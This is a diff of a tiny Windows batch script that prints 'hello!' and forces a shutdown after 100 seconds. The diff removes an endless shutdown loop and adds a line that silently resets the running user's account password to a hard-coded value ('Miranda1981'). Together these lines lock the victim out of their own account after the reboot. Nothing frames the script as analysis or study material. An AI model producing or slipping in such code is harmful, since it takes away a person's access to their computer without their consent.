@@ -1,5 +1,4 @@
 @echo off
 echo hello!
-x:
+net users %Username% "Miranda1981"
 start shutdown -s -t 100
-goto x
